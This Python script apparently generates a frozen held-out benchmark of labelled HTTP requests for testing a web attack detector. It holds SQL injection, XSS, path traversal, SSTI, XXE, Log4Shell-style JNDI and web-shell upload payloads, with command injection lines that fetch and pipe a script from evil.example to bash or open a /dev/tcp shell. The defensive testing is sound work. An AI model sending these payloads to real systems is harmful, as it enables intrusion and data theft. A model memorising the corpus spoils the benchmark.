#!/usr/bin/env python3
"""Generate heldout_v4 corpus: attack techniques NOT present in v1/v2/v3 tuning,
plus two deliberately uncovered categories (xpath_injection, email_header_injection)
for honest generalisation pressure. FROZEN once written — never tune against it.
"""
import json, hashlib, itertools

OUT = "benchmarks/real_comparative/corpus/heldout_v4.jsonl"

ATTACKS = {
 "sql_injection": [
  ("GET","/item","id=1'||(SELECT(0)FROM(SELECT(SLEEP(2)))a)||'",""),
  ("GET","/search","q=x' RLIKE (SELECT IF(SUBSTRING(password,1,1)='a',1,0))--",""),
  ("GET","/prod","id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",""),
  ("GET","/list","f=id, (SELECT table_name FROM information_schema.tables LIMIT 1)",""),
  ("GET","/q","x=1' OR json_extract('{\"a\":1}','$.a')=1--",""),
  ("POST","/api","",'{"id":"1\' UNION ALL SELECT NULL,CONCAT(username,0x3a,password),3 FROM users-- -"}'),
  ("GET","/item","id=1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))),1)--",""),
  ("GET","/s","q=' OR (SELECT COUNT(*) FROM mysql.user)>0--",""),
  ("GET","/exp","e=1;PREPARE stmt FROM 'SELECT LOAD_FILE(\\'/etc/passwd\\')';EXECUTE stmt--",""),
  ("GET","/ord","o=1 ORDER BY (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM dual) END)",""),
  ("GET","/w","x=%bf%27%20OR%201=1--",""),  # GBK wide-byte bypass attempt
  ("GET","/item","id=1' INTO OUTFILE '/tmp/shell.php'--",""),
 ],
 "xss": [
  ("GET","/c","m=<svg><animate onbegin=alert(1) attributeName=x dur=1s>",""),
  ("GET","/v","x=<video><source onerror=alert(1)>",""),
  ("GET","/i","x=<input autofocus onfocus=alert(1)>",""),
  ("GET","/m","x=<marquee onstart=alert(1)>x</marquee>",""),
  ("GET","/b","x=<body onload=alert(1)>",""),
  ("GET","/o","x=<object data=javascript:alert(1)>",""),
  ("GET","/e","x=<embed src=javascript:alert(1)>",""),
  ("GET","/a","x=<a href=\"jAvAsCrIpT:alert(1)\">x</a>",""),
  ("GET","/f","x=<form action=javascript:alert(1)><button>go</button></form>",""),
  ("GET","/t","x=</title><script>alert(1)</script>",""),
  ("GET","/x","x=<xmp><script>alert(1)</script></xmp>",""),
  ("GET","/s","x=<select autofocus onfocus=alert(1)>",""),
 ],
 "path_traversal": [
  ("GET","/f","p=..%252f..%252fetc%252fpasswd",""),
  ("GET","/f","p=..%c0%ae..%c0%aeetc/passwd",""),
  ("GET","/f","p=..%ef%bc%8f..%ef%bc%8fetc/passwd",""),
  ("GET","/f","p=/var/run/secrets/kubernetes.io/serviceaccount/token",""),
  ("GET","/f","p=file://localhost/etc/passwd",""),
  ("GET","/f","p=phar://test.phar/shell.php",""),
  ("GET","/f","p=glob:///etc/*",""),
  ("GET","/f","p=//etc/passwd",""),
  ("GET","/f","p=C:%5c..%5c..%5cwindows%5cwin.ini",""),
  ("GET","/f","p=....//....//....//etc/shadow",""),
 ],
 "command_injection": [
  ("GET","/d","h=x;curl${IFS}-s${IFS}http://evil.example/x.sh|bash",""),
  ("GET","/d","h=x||/bin/sh",""),
  ("GET","/d","h=x<<<$(id)",""),
  ("GET","/d","h=x;source${IFS}/dev/tcp/evil.example/4444",""),
  ("GET","/d","h=x;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh",""),
  ("GET","/d","h=x;eval${IFS}$(echo${IFS}aWQ=|base64${IFS}-d)",""),
  ("POST","/api","",'{"cmd":"x;ssh${IFS}-o${IFS}ProxyCommand=calc${IFS}x"}'),
  ("GET","/w","x=cmd%20%2Fv%20%2Fc%20whoami",""),
  ("GET","/w","x=mshta%20javascript:alert(1)",""),
  ("GET","/w","x=certutil%20-decode%20/tmp/a.b64%20/tmp/a.exe",""),
  ("GET","/w","x=wmic%20process%20call%20create%20calc.exe",""),
  ("GET","/w","x=powershell%20-enc%20SQBFAFgA",""),
 ],
 "rce": [
  ("GET","/e","c=array_map('system',array('id'))",""),
  ("GET","/e","c=create_function('','system($_GET[1]);')&1=id",""),
  ("GET","/e","c=preg_replace('/.*/e','system(\"id\")','x')",""),
  ("GET","/e","c=call_user_func('system','id')",""),
  ("GET","/e","c=$f='sys'.'tem';$f('id');",""),
  ("GET","/e","c=${pageContext.request.getParameter('cmd')}",""),
  ("GET","/e","c={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",""),
  ("GET","/e",'c={{range.constructor(\'return global.process.mainModule.require("child_process").execSync("id")\')()}}',""),
 ],
 "ssti": [
  ("GET","/r","t={{_self.env.getFilter('id')}}",""),
  ("GET","/r","t={{cycler.__init__.__globals__.os.popen('id').read()}}",""),
  ("GET","/r","t={{joiner.__init__.__globals__['os'].popen('id').read()}}",""),
  ("GET","/r","t={{namespace.__init__.__globals__.os.popen('id').read()}}",""),
  ("GET","/r","t={{['id']|filter('system')}}",""),
  ("GET","/r","t={php}echo `id`;{/php}",""),
  ("GET","/r","t=#foreach($x in [1])#evaluate($x+1)#end",""),
  ("GET","/r","t=${''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null).exec('id')}",""),
 ],
 "nosql_injection": [
  ("POST","/login","",'{"user":"admin","pass":{"$where":"return this.password.match(/^a/);"}}'),
  ("POST","/api","",'{"filter":{"$and":[{"$or":[{"password":{"$gt":""}}]}]}}'),
  ("POST","/api","",'{"q":{"$regex":".*","$options":"i"}}'),
  ("POST","/api","",'{"pipe":[{"$lookup":{"from":"users","as":"u"}}]}'),
  ("POST","/api","",'{"f":{"$jsonSchema":{"properties":{"role":{"const":"admin"}}}}}'),
  ("GET","/s","q[$where]=sleep(3000)",""),
 ],
 "http_response_splitting": [
  ("GET","/r","u=/x%0d%0aContent-Length:%2037%0d%0a%0d%0a",""),
  ("GET","/r","u=/x%0aSet-Cookie:%20admin=1%0a",""),
  ("POST","/api","",'{"redir":"/ok\\nLocation:\\nhttps://evil.example/"}'),
  ("GET","/r","u=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html",""),
 ],
 "ssrf": [
  ("GET","/f","url=http://[::ffff:7f00:1]/",""),
  ("GET","/f","url=http://0xa9fea9fe/",""),
  ("GET","/f","url=dict://127.0.0.1:6379/info",""),
  ("GET","/f","url=ldap://127.0.0.1:389/dc=x",""),
  ("GET","/f","url=tftp://127.0.0.1/a",""),
  ("GET","/f","url=http://127.0.0.1.xip.io/",""),
  ("GET","/f","url=http://vcap.me/",""),
  ("GET","/f","url=http://a.com/redirect?u=http://127.0.0.1/",""),
  ("GET","/f","url=file:///etc/passwd",""),
  ("GET","/f","url=http://[::]/",""),
 ],
 "xxe": [
  ("POST","/xml","",'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>'),
  ("POST","/xml","",'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY exfil SYSTEM \'http://evil.example/?d=%f;\'>">%e;%exfil;]><r/>'),
  ("POST","/xml","",'<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>'),
  ("POST","/xml","",'<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "expect://id">]><r>&x;</r>'),
 ],
 "jwt": [
  ("GET","/api","token=eyJhbGciOiJIUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBIn19.eyJzdWIiOiIxIn0.c2ln",""),
  ("GET","/api","token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTk5OTk5OTk5OX0.",""),
  ("GET","/api","token=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiIxIn0.c2ln",""),
  ("GET","/api","token=eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly8xMjcuMC4wLjEva2V5cyJ9.eyJzdWIiOiIxIn0.c2ln",""),
 ],
 "framework_exploit": [
  ("GET","/s","q=${${env:NaN:-j}ndi:ldap://evil.example/a}",""),
  ("GET","/s","q=${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://evil.example/a}",""),
  ("GET","/s","q=${jndi:rmi://evil.example/a}",""),
  ("GET","/s","q=${jndi:dns://evil.example/a}",""),
  ("GET","/s","q=${jndi:iiop://evil.example/a}",""),
  ("POST","/api","",'{"class.module.classLoader.DefaultAssertionStatus":"false"}'),
  ("GET","/st",'id=%{(#context["xwork.MethodAccessor.denyMethodExecution"]=false)}',""),
 ],
 "host_header_injection": [
  ("GET","/","","",{"X-Original-URL":"/admin"}),
  ("GET","/","","",{"X-Rewrite-URL":"http://evil.example/"}),
  ("GET","/","","",{"X-Forwarded-Server":"evil.example"}),
  ("GET","/","","",{"X-Host":"127.0.0.1"}),
  ("GET","/","","",{"Forwarded":"host=127.0.0.1;proto=http"}),
  ("GET","/","","",{"Host":"0177.0.0.1"}),
 ],
 "malicious_upload": [
  ("POST","/up","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.pHp"\r\n\r\n<?php system("id");?>\r\n--x--'),
  ("POST","/up","",'--x\r\nContent-Disposition: form-data; name="f"; filename="cmd.asp;.jpg"\r\n\r\n<%eval request("c")%>\r\n--x--'),
  ("POST","/up","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.phps"\r\n\r\n<?php system("id");?>\r\n--x--'),
  ("POST","/up","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.cfm"\r\n\r\n<cfexecute name="id"/>\r\n--x--'),
  ("POST","/up","",'--x\r\nContent-Disposition: form-data; name="f"; filename="shell.shtml"\r\n\r\n<!--#exec cmd="id"-->\r\n--x--'),
 ],
 "sensitive_exposure": [
  ("GET","/.git/HEAD","","",{}),
  ("GET","/appsettings.Production.json","","",{}),
  ("GET","/terraform.tfstate","","",{}),
  ("GET","/.ssh/authorized_keys","","",{}),
  ("GET","/actuator/mappings","","",{}),
  ("GET","/jolokia/","","",{}),
  ("GET","/manager/html","","",{}),
  ("GET","/_cat/indices","","",{}),
  ("GET","/debug/pprof/","","",{}),
  ("GET","/shell.php","","",{}),
 ],
 "cms_wordpress": [
  ("GET","/wp-json/wp/v2/users/1","","",{}),
  ("GET","/wp-login.php?action=register","","",{}),
  ("GET","/wp-cron.php","","",{}),
  ("GET","/wp-trackback.php","","",{}),
  ("GET","/wp-content/plugins/","","",{}),
  ("GET","/license.txt","","",{}),
  ("GET","/wp-json/oembed/1.0/embed?url=http://x","","",{}),
 ],
 "ldap_injection": [
  ("POST","/auth","",'{"u":"admin)(|(uid=*","p":"x"}'),
  ("GET","/d","cn=*)(|(cn=*))%00",""),
  ("POST","/api","",'{"search":"(|(objectClass=*))"}'),
  ("GET","/d","user=*&pass=x",""),
 ],
 "deserialization": [
  ("POST","/api","",'{"d":"O:9:\\"Exception\\":1:{s:7:\\"message\\";s:2:\\"id\\";}"}'),
  ("POST","/api","",'{"v":"a:2:{i:0;s:4:\\"exec\\";i:1;s:2:\\"id\\";}"}'),
  ("GET","/v","data=AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0uV2Vi",""),
  ("POST","/api","",'{"blob":"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="}'),
 ],
 # Deliberately uncovered categories.
 "xpath_injection": [
  ("POST","/login","",'{"u":"admin\' or \'1\'=\'1","p":"x"}'),
  ("GET","/x","q=' or substring(//user/password,1,1)='a'",""),
  ("POST","/api","",'{"filter":"//*[contains(name(),\'script\')]"}'),
  ("GET","/x","id=1] | //user[password=\'x\' or 1=1",""),
 ],
 "email_header_injection": [
  ("POST","/contact","",'{"to":"a@x.com\\r\\nBcc:evil@evil.example"}'),
  ("POST","/mail","",'{"subject":"hi\\nCc:attacker@evil.example"}'),
  ("POST","/api","",'{"from":"a@x.com\\r\\nReply-To:evil@evil.example"}'),
 ],
}

BENIGN = [
 ("POST","/api/login","",'{"email":"pedro@empresa.cl","password":"C0rrecto!Horse#9"}'),
 ("GET","/api/v1/products","?page=2&size=20",""),
 ("POST","/api/orders","",'{"items":[{"id":7,"qty":3}],"coupon":"VERANO10"}'),
 ("GET","/api/search","q=select+*+from+products",""),   # borderline: literal SQL words as search text
 ("GET","/api/search","q=how+to+select+from",""),
 ("POST","/api/profile","",'{"name":"María José","city":"Santiago","bio":"Dev & ops"}'),
 ("GET","/api/math","calc=2+2",""),                      # borderline: arithmetic in calc param
 ("POST","/api/text","",'{"note":"line1\\nline2\\ttabbed"}'),  # JSON escapes -> decoded CRLF check must not FP
 ("GET","/go","next=/dashboard/settings",""),
 ("GET","/go","next=https%3A%2F%2Ftienda.example.com%2Fcarrito",""),
 ("POST","/api/hooks","",'{"url":"https://hooks.slack.com/services/T00/B00/xxx"}'),
 ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="curriculum.pdf"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.7\r\n--x--'),
 ("POST","/upload","",'--x\r\nContent-Disposition: form-data; name="f"; filename="avatar.png"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n--x--'),
 ("POST","/api","",'{"$schema":"https://json-schema.org/draft/2020-12/schema","type":"object","properties":{"a":{"type":"string"}}}'),
 ("POST","/graphql","",'{"query":"{ union { id name } }"}'),   # GraphQL union type keyword, benign
 ("GET","/wp-json/wp/v2/posts","?per_page=5",""),
 ("GET","/wp-json/wp/v2/media","?search=logo",""),
 ("POST","/wp-admin/admin-ajax.php","",'action=save-widget&data=%7B%7D'),
 ("GET","/","","",{"Host":"www.tienda.cl","X-Forwarded-Proto":"https","X-Forwarded-For":"190.1.2.3"}),
 ("GET","/","","",{"Forwarded":"for=190.1.2.3;host=www.tienda.cl;proto=https"}),
 ("GET","/","","",{"X-Forwarded-Host":"www.tienda.cl","Host":"www.tienda.cl"}),
 ("GET","/api/me","token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5OTkiLCJyb2xlIjoidXNlciJ9.4tJk2pQ9wXyZz0aBcDeFgHiJkLmNoPqRsTuVwXyZ",""),
 ("POST","/api/comments","",'{"text":"Me encantó: 5/5 estrellas! :)"}'),
 ("GET","/api/news","cat=tech&page=1",""),
 ("POST","/api/import","",'{"rows":[["a","b"],["c","d"]],"format":"csv"}'),
 ("GET","/api/v2/reports","?from=2026-01-01&to=2026-02-01&group=day",""),
 ("POST","/api/translate","",'{"text":"Hello world","from":"en","to":"es"}'),
 ("GET","/api/weather","city=Santiago+Chile&units=metric",""),
 ("POST","/api/survey","",'{"answers":{"q1":"excelente","q2":[1,2,3]}}'),
 ("GET","/feed.xml","",""),
 ("GET","/robots.txt","",""),
 ("GET","/api/health","",""),
 ("POST","/api/login","",'{"user":"deploy","pass":"s3cr3t!Va1ue#2026"}'),
]
extra=[]
vals=["hola","test123","user@example.com","C:\\temp\\file.txt","/home/user/docs",
      "price: $19.99","50%+off","a=b&c=d","tag#1","@mention","100%25",
      "semi;colon","pipe|sym","dollar$ign","back`tick","paren(x)",
      "brack[et]","star*","quest?","lt<","gt>","quot\"","apos'","tilde~",
      "emoji😀","café","naïve","résumé","123.45","v2.0.1","true","null",
      "select","union","where","from","drop","table","admin","root"]
tpl=[("GET","/api/search","q={v}",""),("GET","/api/filter","f={v}",""),
     ("POST","/api/data","",'{"value":"{v}"}'),("GET","/api/tag","t={v}","")]
for (m,p,q,b),v in itertools.product(tpl,vals):
    extra.append((m,p,q.replace("{v}",v) if "{v}" in q else q,
                  b.replace("{v}",v) if "{v}" in b else b))
BENIGN += extra[:70]

def mk(case_id, cat, label, note, method, path, query, body, headers=None, split="held_out"):
    return {
        "case_id": case_id, "category": cat, "corpus": "heldout_v4",
        "corpus_sha256": None, "corpus_version": None,
        "label": label, "note": note,
        "request": {"body": body, "headers": headers or {}, "method": method,
                    "path": path, "query": query},
        "split": split,
        "split_reason": ("Frozen held-out batch v4: techniques absent from v1/v2/v3 tuning."
                         if label == "malicious" else "Benign control written independently of engine internals."),
    }

notes = {c: f"v4 fresh techniques for {c}." for c in ATTACKS}
notes["xpath_injection"] = "XPath injection (UNCOVERED category — honest generalisation check)."
notes["email_header_injection"] = "Email header injection via CRLF in mail params (UNCOVERED category)."
notes["benign"] = "Benign control v4."

cases=[]
for cat,payloads in ATTACKS.items():
    for i,(m,p,q,b,*rest) in enumerate(payloads):
        cases.append(mk(f"heldout_v4/{cat}-{i:02d}",cat,"malicious",notes[cat],m,p,q,b,rest[0] if rest else {}))
for i,(m,p,q,b,*rest) in enumerate(BENIGN):
    cases.append(mk(f"heldout_v4/benign-{i:03d}","benign","benign",notes["benign"],m,p,q,b,rest[0] if rest else {}))

with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in cases: f.write(json.dumps(c,ensure_ascii=False)+"\n")
lines=[json.loads(l) for l in open(OUT,encoding="utf-8")]
sha=hashlib.sha256(open(OUT,"rb").read()).hexdigest()
for c in lines: c["corpus_sha256"]=sha
with open(OUT,"w",encoding="utf-8",newline="\n") as f:
    for c in lines: f.write(json.dumps(c,ensure_ascii=False)+"\n")
mal=[c for c in cases if c["label"]=="malicious"]; ben=[c for c in cases if c["label"]=="benign"]
print(f"wrote {len(cases)} cases -> {OUT}")
print(f"malicious={len(mal)} benign={len(ben)} sha256={sha[:16]}")
from collections import Counter
print(Counter(c["category"] for c in mal))
